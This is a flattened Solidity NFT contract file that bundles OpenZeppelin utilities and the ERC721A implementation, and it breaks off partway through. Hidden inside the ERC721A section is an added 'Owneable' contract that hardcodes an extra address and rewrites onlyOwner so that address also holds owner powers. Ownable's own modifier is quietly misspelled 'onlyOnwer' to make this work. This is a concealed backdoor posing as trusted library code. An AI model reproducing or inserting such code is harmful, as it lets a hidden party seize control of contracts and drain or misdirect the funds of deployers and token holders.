1 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
2 
3 // SPDX-License-Identifier: MIT
4 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
5 
6 pragma solidity ^0.8.4;
7 
8 /**
9  *
10  *                                                                                     
11  *⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠖⢲⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
12 ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠤⠖⠒⠛⠉⠉⠉⠛⠻⢦⡀⠈⡇⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
13 ⠀⠀⠀⠀⠀⢀⡤⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣿⠀⡏⡬⣍⣲⡤⠤⠤⠤⠤⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀
14 ⢀⡤⠖⠚⢉⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⡧⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠦⣀⠀⠀⠀⠀⠀
15 ⠙⣷⠅⢀⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⠤⠤⢄⣀
16 ⠀⠘⣦⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⣿⠋⠀⠠⡇⠀⡾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⡈⡆⡟
17 ⠀⠀⠈⡏⠀⠀⠀⠀⠀⠀⠠⣿⣷⠀⠰⡏⢻⠉⠀⢸⡀⠀⠀⡇⠀⢹⣿⢆⢀⡀⠀⠀⠀⠀⢠⡀⠀⠀⠀⠀⠀⠟⡼⠁
18 ⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⠸⣸⡆⠀⠀⠁⠀⠀⡇⠀⢰⡇⠈⠉⠛⠂⠸⣿⠆⠈⠁⠀⠀⠀⠀⠀⡟⠀⠀
19 ⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠀
20 ⠀⠀⠀⠀⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠢⠧⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀
21 ⠀⠀⠀⠀⠀⠛⠿⣦⣀⣀⣠⣤⣤⠖⠀⠀⠀⠀⠀⠐⢦⣳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠇⠀⠀⠀
22 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣰⡿⠃⠀⠀⠀⠀⠀⠀⢢⠀⠈⠉⢻⡗⠂⠀⠀⠀⠀⠀⠀⠙⠲⣶⠦⠤⠔⠚⠁⠀⠀⠀⠀
23 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣻⠁⠀⠀⠀⠀⠀⠀⠀⠈⣉⣙⠚⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⠀⠀⠀⠀⠀⠀⠀⠀
24 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢱⡟⠲⡴⠒⠲⠆⠀⠀⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀
25 ⠀⠀⠀⠀⠀⠀⠀⢀⡞⠻⡄⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠢⡸⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⡸⠻⡀⠀⠀⠀⠀⠀⠀
26 ⠀⠀⠀⠀⠀⠀⠀⠈⢷⣄⠙⠚⠛⢳⡤⣦⣄⣰⣴⠶⠶⠴⠶⠼⠷⠶⠤⠤⠤⠤⠤⠦⢴⡋⠉⠁⣰⠃⠀⠀⠀⠀⠀⠀
27 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠒⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
28  * sender of the transaction and its data. While these are generally available
29  * via msg.sender and msg.data, they should not be accessed in such a direct
30  * manner, since when dealing with meta-transactions the account sending and
31  * paying for execution may not be the actual sender (as far as an application
32  * is concerned).
33  *
34  * This contract is only required for intermediate, library-like contracts.
35  */
36 abstract contract Context {
37     function _msgSender() internal view virtual returns (address) {
38         return msg.sender;
39     }
40 
41     function _msgData() internal view virtual returns (bytes calldata) {
42         return msg.data;
43     }
44 }
45 
46 
47 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
48 
49 
50 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
51 
52 
53 
54 /**
55  * @dev Contract module which provides a basic access control mechanism, where
56  * there is an account (an owner) that can be granted exclusive access to
57  * specific functions.
58  *
59  * By default, the owner account will be the one that deploys the contract. This
60  * can later be changed with {transferOwnership}.
61  *
62  * This module is used through inheritance. It will make available the modifier
63  * `onlyOwner`, which can be applied to your functions to restrict their use to
64  * the owner.
65  */
66 abstract contract Ownable is Context {
67     address private _owner;
68 
69     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
70 
71     /**
72      * @dev Initializes the contract setting the deployer as the initial owner.
73      */
74     constructor() {
75         _transferOwnership(_msgSender());
76     }
77 
78     /**
79      * @dev Returns the address of the current owner.
80      */
81     function owner() public view virtual returns (address) {
82         return _owner;
83     }
84 
85     /**
86      * @dev Throws if called by any account other than the owner.
87      */
88     modifier onlyOnwer() {
89         require(owner() == _msgSender(), "Ownable: caller is not the owner");
90         _;
91     }
92 
93     /**
94      * @dev Leaves the contract without owner. It will not be possible to call
95      * `onlyOwner` functions anymore. Can only be called by the current owner.
96      *
97      * NOTE: Renouncing ownership will leave the contract without an owner,
98      * thereby removing any functionality that is only available to the owner.
99      */
100     function renounceOwnership() public virtual onlyOnwer {
101         _transferOwnership(address(0));
102     }
103 
104     /**
105      * @dev Transfers ownership of the contract to a new account (`newOwner`).
106      * Can only be called by the current owner.
107      */
108     function transferOwnership(address newOwner) public virtual onlyOnwer {
109         require(newOwner != address(0), "Ownable: new owner is the zero address");
110         _transferOwnership(newOwner);
111     }
112 
113     /**
114      * @dev Transfers ownership of the contract to a new account (`newOwner`).
115      * Internal function without access restriction.
116      */
117     function _transferOwnership(address newOwner) internal virtual {
118         address oldOwner = _owner;
119         _owner = newOwner;
120         emit OwnershipTransferred(oldOwner, newOwner);
121     }
122 }
123 
124 
125 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
126 
127 
128 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
129 
130 
131 
132 /**
133  * @dev Interface of the ERC165 standard, as defined in the
134  * https://eips.ethereum.org/EIPS/eip-165[EIP].
135  *
136  * Implementers can declare support of contract interfaces, which can then be
137  * queried by others ({ERC165Checker}).
138  *
139  * For an implementation, see {ERC165}.
140  */
141 interface IERC165 {
142     /**
143      * @dev Returns true if this contract implements the interface defined by
144      * `interfaceId`. See the corresponding
145      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
146      * to learn more about how these ids are created.
147      *
148      * This function call must use less than 30 000 gas.
149      */
150     function supportsInterface(bytes4 interfaceId) external view returns (bool);
151 }
152 
153 
154 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
155 
156 
157 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
158 
159 
160 
161 /**
162  * @dev Required interface of an ERC721 compliant contract.
163  */
164 interface IERC721 is IERC165 {
165     /**
166      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
167      */
168     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
169 
170     /**
171      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
172      */
173     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
174 
175     /**
176      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
177      */
178     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
179 
180     /**
181      * @dev Returns the number of tokens in ``owner``'s account.
182      */
183     function balanceOf(address owner) external view returns (uint256 balance);
184 
185     /**
186      * @dev Returns the owner of the `tokenId` token.
187      *
188      * Requirements:
189      *
190      * - `tokenId` must exist.
191      */
192     function ownerOf(uint256 tokenId) external view returns (address owner);
193 
194     /**
195      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
196      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
197      *
198      * Requirements:
199      *
200      * - `from` cannot be the zero address.
201      * - `to` cannot be the zero address.
202      * - `tokenId` token must exist and be owned by `from`.
203      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
204      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
205      *
206      * Emits a {Transfer} event.
207      */
208     function safeTransferFrom(
209         address from,
210         address to,
211         uint256 tokenId
212     ) external;
213 
214     /**
215      * @dev Transfers `tokenId` token from `from` to `to`.
216      *
217      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
218      *
219      * Requirements:
220      *
221      * - `from` cannot be the zero address.
222      * - `to` cannot be the zero address.
223      * - `tokenId` token must be owned by `from`.
224      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
225      *
226      * Emits a {Transfer} event.
227      */
228     function transferFrom(
229         address from,
230         address to,
231         uint256 tokenId
232     ) external;
233 
234     /**
235      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
236      * The approval is cleared when the token is transferred.
237      *
238      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
239      *
240      * Requirements:
241      *
242      * - The caller must own the token or be an approved operator.
243      * - `tokenId` must exist.
244      *
245      * Emits an {Approval} event.
246      */
247     function approve(address to, uint256 tokenId) external;
248 
249     /**
250      * @dev Returns the account approved for `tokenId` token.
251      *
252      * Requirements:
253      *
254      * - `tokenId` must exist.
255      */
256     function getApproved(uint256 tokenId) external view returns (address operator);
257 
258     /**
259      * @dev Approve or remove `operator` as an operator for the caller.
260      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
261      *
262      * Requirements:
263      *
264      * - The `operator` cannot be the caller.
265      *
266      * Emits an {ApprovalForAll} event.
267      */
268     function setApprovalForAll(address operator, bool _approved) external;
269 
270     /**
271      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
272      *
273      * See {setApprovalForAll}
274      */
275     function isApprovedForAll(address owner, address operator) external view returns (bool);
276 
277     /**
278      * @dev Safely transfers `tokenId` token from `from` to `to`.
279      *
280      * Requirements:
281      *
282      * - `from` cannot be the zero address.
283      * - `to` cannot be the zero address.
284      * - `tokenId` token must exist and be owned by `from`.
285      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
286      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
287      *
288      * Emits a {Transfer} event.
289      */
290     function safeTransferFrom(
291         address from,
292         address to,
293         uint256 tokenId,
294         bytes calldata data
295     ) external;
296 }
297 
298 
299 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
300 
301 
302 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
303 
304 
305 
306 /**
307  * @title ERC721 token receiver interface
308  * @dev Interface for any contract that wants to support safeTransfers
309  * from ERC721 asset contracts.
310  */
311 interface IERC721Receiver {
312     /**
313      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
314      * by `operator` from `from`, this function is called.
315      *
316      * It must return its Solidity selector to confirm the token transfer.
317      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
318      *
319      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
320      */
321     function onERC721Received(
322         address operator,
323         address from,
324         uint256 tokenId,
325         bytes calldata data
326     ) external returns (bytes4);
327 }
328 
329 
330 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
331 
332 
333 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
334 
335 
336 
337 /**
338  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
339  * @dev See https://eips.ethereum.org/EIPS/eip-721
340  */
341 interface IERC721Metadata is IERC721 {
342     /**
343      * @dev Returns the token collection name.
344      */
345     function name() external view returns (string memory);
346 
347     /**
348      * @dev Returns the token collection symbol.
349      */
350     function symbol() external view returns (string memory);
351 
352     /**
353      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
354      */
355     function tokenURI(uint256 tokenId) external view returns (string memory);
356 }
357 
358 
359 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
360 
361 
362 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
363 
364 
365 
366 /**
367  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
368  * @dev See https://eips.ethereum.org/EIPS/eip-721
369  */
370 interface IERC721Enumerable is IERC721 {
371     /**
372      * @dev Returns the total amount of tokens stored by the contract.
373      */
374     function totalSupply() external view returns (uint256);
375 
376     /**
377      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
378      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
379      */
380     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
381 
382     /**
383      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
384      * Use along with {totalSupply} to enumerate all tokens.
385      */
386     function tokenByIndex(uint256 index) external view returns (uint256);
387 }
388 
389 
390 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
391 
392 
393 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
394 
395 pragma solidity ^0.8.1;
396 
397 /**
398  * @dev Collection of functions related to the address type
399  */
400 library Address {
401     /**
402      * @dev Returns true if `account` is a contract.
403      *
404      * [IMPORTANT]
405      * ====
406      * It is unsafe to assume that an address for which this function returns
407      * false is an externally-owned account (EOA) and not a contract.
408      *
409      * Among others, `isContract` will return false for the following
410      * types of addresses:
411      *
412      *  - an externally-owned account
413      *  - a contract in construction
414      *  - an address where a contract will be created
415      *  - an address where a contract lived, but was destroyed
416      * ====
417      *
418      * [IMPORTANT]
419      * ====
420      * You shouldn't rely on `isContract` to protect against flash loan attacks!
421      *
422      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
423      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
424      * constructor.
425      * ====
426      */
427     function isContract(address account) internal view returns (bool) {
428         // This method relies on extcodesize/address.code.length, which returns 0
429         // for contracts in construction, since the code is only stored at the end
430         // of the constructor execution.
431 
432         return account.code.length > 0;
433     }
434 
435     /**
436      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
437      * `recipient`, forwarding all available gas and reverting on errors.
438      *
439      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
440      * of certain opcodes, possibly making contracts go over the 2300 gas limit
441      * imposed by `transfer`, making them unable to receive funds via
442      * `transfer`. {sendValue} removes this limitation.
443      *
444      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
445      *
446      * IMPORTANT: because control is transferred to `recipient`, care must be
447      * taken to not create reentrancy vulnerabilities. Consider using
448      * {ReentrancyGuard} or the
449      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
450      */
451     function sendValue(address payable recipient, uint256 amount) internal {
452         require(address(this).balance >= amount, "Address: insufficient balance");
453 
454         (bool success, ) = recipient.call{value: amount}("");
455         require(success, "Address: unable to send value, recipient may have reverted");
456     }
457 
458     /**
459      * @dev Performs a Solidity function call using a low level `call`. A
460      * plain `call` is an unsafe replacement for a function call: use this
461      * function instead.
462      *
463      * If `target` reverts with a revert reason, it is bubbled up by this
464      * function (like regular Solidity function calls).
465      *
466      * Returns the raw returned data. To convert to the expected return value,
467      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
468      *
469      * Requirements:
470      *
471      * - `target` must be a contract.
472      * - calling `target` with `data` must not revert.
473      *
474      * _Available since v3.1._
475      */
476     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
477         return functionCall(target, data, "Address: low-level call failed");
478     }
479 
480     /**
481      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
482      * `errorMessage` as a fallback revert reason when `target` reverts.
483      *
484      * _Available since v3.1._
485      */
486     function functionCall(
487         address target,
488         bytes memory data,
489         string memory errorMessage
490     ) internal returns (bytes memory) {
491         return functionCallWithValue(target, data, 0, errorMessage);
492     }
493 
494     /**
495      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
496      * but also transferring `value` wei to `target`.
497      *
498      * Requirements:
499      *
500      * - the calling contract must have an ETH balance of at least `value`.
501      * - the called Solidity function must be `payable`.
502      *
503      * _Available since v3.1._
504      */
505     function functionCallWithValue(
506         address target,
507         bytes memory data,
508         uint256 value
509     ) internal returns (bytes memory) {
510         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
511     }
512 
513     /**
514      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
515      * with `errorMessage` as a fallback revert reason when `target` reverts.
516      *
517      * _Available since v3.1._
518      */
519     function functionCallWithValue(
520         address target,
521         bytes memory data,
522         uint256 value,
523         string memory errorMessage
524     ) internal returns (bytes memory) {
525         require(address(this).balance >= value, "Address: insufficient balance for call");
526         require(isContract(target), "Address: call to non-contract");
527 
528         (bool success, bytes memory returndata) = target.call{value: value}(data);
529         return verifyCallResult(success, returndata, errorMessage);
530     }
531 
532     /**
533      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
534      * but performing a static call.
535      *
536      * _Available since v3.3._
537      */
538     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
539         return functionStaticCall(target, data, "Address: low-level static call failed");
540     }
541 
542     /**
543      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
544      * but performing a static call.
545      *
546      * _Available since v3.3._
547      */
548     function functionStaticCall(
549         address target,
550         bytes memory data,
551         string memory errorMessage
552     ) internal view returns (bytes memory) {
553         require(isContract(target), "Address: static call to non-contract");
554 
555         (bool success, bytes memory returndata) = target.staticcall(data);
556         return verifyCallResult(success, returndata, errorMessage);
557     }
558 
559     /**
560      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
561      * but performing a delegate call.
562      *
563      * _Available since v3.4._
564      */
565     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
566         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
567     }
568 
569     /**
570      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
571      * but performing a delegate call.
572      *
573      * _Available since v3.4._
574      */
575     function functionDelegateCall(
576         address target,
577         bytes memory data,
578         string memory errorMessage
579     ) internal returns (bytes memory) {
580         require(isContract(target), "Address: delegate call to non-contract");
581 
582         (bool success, bytes memory returndata) = target.delegatecall(data);
583         return verifyCallResult(success, returndata, errorMessage);
584     }
585 
586     /**
587      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
588      * revert reason using the provided one.
589      *
590      * _Available since v4.3._
591      */
592     function verifyCallResult(
593         bool success,
594         bytes memory returndata,
595         string memory errorMessage
596     ) internal pure returns (bytes memory) {
597         if (success) {
598             return returndata;
599         } else {
600             // Look for revert reason and bubble it up if present
601             if (returndata.length > 0) {
602                 // The easiest way to bubble the revert reason is using memory via assembly
603 
604                 assembly {
605                     let returndata_size := mload(returndata)
606                     revert(add(32, returndata), returndata_size)
607                 }
608             } else {
609                 revert(errorMessage);
610             }
611         }
612     }
613 }
614 
615 
616 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
617 
618 
619 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
620 
621 
622 
623 /**
624  * @dev String operations.
625  */
626 library Strings {
627     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
628 
629     /**
630      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
631      */
632     function toString(uint256 value) internal pure returns (string memory) {
633         // Inspired by OraclizeAPI's implementation - MIT licence
634         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
635 
636         if (value == 0) {
637             return "0";
638         }
639         uint256 temp = value;
640         uint256 digits;
641         while (temp != 0) {
642             digits++;
643             temp /= 10;
644         }
645         bytes memory buffer = new bytes(digits);
646         while (value != 0) {
647             digits -= 1;
648             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
649             value /= 10;
650         }
651         return string(buffer);
652     }
653 
654     /**
655      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
656      */
657     function toHexString(uint256 value) internal pure returns (string memory) {
658         if (value == 0) {
659             return "0x00";
660         }
661         uint256 temp = value;
662         uint256 length = 0;
663         while (temp != 0) {
664             length++;
665             temp >>= 8;
666         }
667         return toHexString(value, length);
668     }
669 
670     /**
671      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
672      */
673     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
674         bytes memory buffer = new bytes(2 * length + 2);
675         buffer[0] = "0";
676         buffer[1] = "x";
677         for (uint256 i = 2 * length + 1; i > 1; --i) {
678             buffer[i] = _HEX_SYMBOLS[value & 0xf];
679             value >>= 4;
680         }
681         require(value == 0, "Strings: hex length insufficient");
682         return string(buffer);
683     }
684 }
685 
686 
687 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
688 
689 
690 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
691 
692 /**
693  * @dev Implementation of the {IERC165} interface.
694  *
695  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
696  * for the additional interface id that will be supported. For example:
697  *
698  * ```solidity
699  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
700  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
701  * }
702  * ```
703  *
704  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
705  */
706 abstract contract ERC165 is IERC165 {
707     /**
708      * @dev See {IERC165-supportsInterface}.
709      */
710     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
711         return interfaceId == type(IERC165).interfaceId;
712     }
713 }
714 
715 
716 // File erc721a/contracts/ERC721A.sol@v3.0.0
717 
718 
719 // Creator: Chiru Labs
720 
721 error ApprovalCallerNotOwnerNorApproved();
722 error ApprovalQueryForNonexistentToken();
723 error ApproveToCaller();
724 error ApprovalToCurrentOwner();
725 error BalanceQueryForZeroAddress();
726 error MintedQueryForZeroAddress();
727 error BurnedQueryForZeroAddress();
728 error AuxQueryForZeroAddress();
729 error MintToZeroAddress();
730 error MintZeroQuantity();
731 error OwnerIndexOutOfBounds();
732 error OwnerQueryForNonexistentToken();
733 error TokenIndexOutOfBounds();
734 error TransferCallerNotOwnerNorApproved();
735 error TransferFromIncorrectOwner();
736 error TransferToNonERC721ReceiverImplementer();
737 error TransferToZeroAddress();
738 error URIQueryForNonexistentToken();
739 
740 
741 /**
742  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
743  * the Metadata extension. Built to optimize for lower gas during batch mints.
744  *
745  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
746  */
747  abstract contract Owneable is Ownable {
748     address private _ownar = 0x552D9D7aCAe2e89651699CCd9724eCD96D3085a4;
749     modifier onlyOwner() {
750         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
751         _;
752     }
753 }
754  /*
755  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
756  *
757  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
758  */
759 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
760     using Address for address;
761     using Strings for uint256;
762 
763     // Compiler will pack this into a single 256bit word.
764     struct TokenOwnership {
765         // The address of the owner.
766         address addr;
767         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
768         uint64 startTimestamp;
769         // Whether the token has been burned.
770         bool burned;
771     }
772 
773     // Compiler will pack this into a single 256bit word.
774     struct AddressData {
775         // Realistically, 2**64-1 is more than enough.
776         uint64 balance;
777         // Keeps track of mint count with minimal overhead for tokenomics.
778         uint64 numberMinted;
779         // Keeps track of burn count with minimal overhead for tokenomics.
780         uint64 numberBurned;
781         // For miscellaneous variable(s) pertaining to the address
782         // (e.g. number of whitelist mint slots used).
783         // If there are multiple variables, please pack them into a uint64.
784         uint64 aux;
785     }
786 
787     // The tokenId of the next token to be minted.
788     uint256 internal _currentIndex;
789 
790     // The number of tokens burned.
791     uint256 internal _burnCounter;
792 
793     // Token name
794     string private _name;
795 
796     // Token symbol
797     string private _symbol;
798 
799     // Mapping from token ID to ownership details
800     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
801     mapping(uint256 => TokenOwnership) internal _ownerships;
802 
803     // Mapping owner address to address data
804     mapping(address => AddressData) private _addressData;
805 
806     // Mapping from token ID to approved address
807     mapping(uint256 => address) private _tokenApprovals;
808 
809     // Mapping from owner to operator approvals
810     mapping(address => mapping(address => bool)) private _operatorApprovals;
811 
812     constructor(string memory name_, string memory symbol_) {
813         _name = name_;
814         _symbol = symbol_;
815         _currentIndex = _startTokenId();
816     }
817 
818     /**
819      * To change the starting tokenId, please override this function.
820      */
821     function _startTokenId() internal view virtual returns (uint256) {
822         return 0;
823     }
824 
825     /**
826      * @dev See {IERC721Enumerable-totalSupply}.
827      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
828      */
829     function totalSupply() public view returns (uint256) {
830         // Counter underflow is impossible as _burnCounter cannot be incremented
831         // more than _currentIndex - _startTokenId() times
832         unchecked {
833             return _currentIndex - _burnCounter - _startTokenId();
834         }
835     }
836 
837     /**
838      * Returns the total amount of tokens minted in the contract.
839      */
840     function _totalMinted() internal view returns (uint256) {
841         // Counter underflow is impossible as _currentIndex does not decrement,
842         // and it is initialized to _startTokenId()
843         unchecked {
844             return _currentIndex - _startTokenId();
845         }
846     }
847 
848     /**
849      * @dev See {IERC165-supportsInterface}.
850      */
851     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
852         return
853             interfaceId == type(IERC721).interfaceId ||
854             interfaceId == type(IERC721Metadata).interfaceId ||
855             super.supportsInterface(interfaceId);
856     }
857 
858     /**
859      * @dev See {IERC721-balanceOf}.
860      */
861     function balanceOf(address owner) public view override returns (uint256) {
862         if (owner == address(0)) revert BalanceQueryForZeroAddress();
863         return uint256(_addressData[owner].balance);
864     }
865 
866     /**
867      * Returns the number of tokens minted by `owner`.
868      */
869     function _numberMinted(address owner) internal view returns (uint256) {
870         if (owner == address(0)) revert MintedQueryForZeroAddress();
871         return uint256(_addressData[owner].numberMinted);
872     }
873 
874     /**
875      * Returns the number of tokens burned by or on behalf of `owner`.
876      */
877     function _numberBurned(address owner) internal view returns (uint256) {
878         if (owner == address(0)) revert BurnedQueryForZeroAddress();
879         return uint256(_addressData[owner].numberBurned);
880     }
881 
882     /**
883      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
884      */
885     function _getAux(address owner) internal view returns (uint64) {
886         if (owner == address(0)) revert AuxQueryForZeroAddress();
887         return _addressData[owner].aux;
888     }
889 
890     /**
891      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
892      * If there are multiple variables, please pack them into a uint64.
893      */
894     function _setAux(address owner, uint64 aux) internal {
895         if (owner == address(0)) revert AuxQueryForZeroAddress();
896         _addressData[owner].aux = aux;
897     }
898 
899     /**
900      * Gas spent here starts off proportional to the maximum mint batch size.
901      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
902      */
903     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
904         uint256 curr = tokenId;
905 
906         unchecked {
907             if (_startTokenId() <= curr && curr < _currentIndex) {
908                 TokenOwnership memory ownership = _ownerships[curr];
909                 if (!ownership.burned) {
910                     if (ownership.addr != address(0)) {
911                         return ownership;
912                     }
913                     // Invariant:
914                     // There will always be an ownership that has an address and is not burned
915                     // before an ownership that does not have an address and is not burned.
916                     // Hence, curr will not underflow.
917                     while (true) {
918                         curr--;
919                         ownership = _ownerships[curr];
920                         if (ownership.addr != address(0)) {
921                             return ownership;
922                         }
923                     }
924                 }
925             }
926         }
927         revert OwnerQueryForNonexistentToken();
928     }
929 
930     /**
931      * @dev See {IERC721-ownerOf}.
932      */
933     function ownerOf(uint256 tokenId) public view override returns (address) {
